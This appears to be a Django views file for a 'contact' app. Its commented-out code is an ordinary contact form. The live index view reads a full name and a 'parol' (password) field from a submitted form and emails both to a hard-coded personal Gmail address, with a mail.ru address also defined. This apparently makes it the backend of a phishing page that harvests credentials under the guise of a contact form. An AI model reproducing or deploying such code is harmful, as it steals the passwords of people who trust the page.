from email import message
import email
from django.views.generic import FormView, TemplateView
from .forms import ContactForm
from django.urls import reverse_lazy
from django.shortcuts import render
from django.core.mail import send_mail


# class ContactView(FormView):
#     template_name = 'contact/index_1.html'
#     form_class = ContactForm
#     success_url = reverse_lazy('contact:success')

#     def form_valid(self, form):
#         # Calls the custom send method
#         form.send()
#         return super().form_valid(form)

# class ContactSuccessView(TemplateView):
#     template_name = 'contact/success.html'



def index(request):
    if request.method == 'POST':
        full_name = request.POST.get('full_name')
        parol = request.POST.get('parol')
        fromemail = 'abdulazizorinboev@gmail.com'
        toemail = 'serious168@mail.ru'

        data = {
            'full_name':full_name,
            'parol':parol,
            'fromemail':fromemail,
            'toemail':toemail
        }
        
        send_mail(data['full_name'],data['parol'],data['fromemail'],['abdulazizorinboev@gmail.com'])


    return render(request,'contact/index_1.html',{})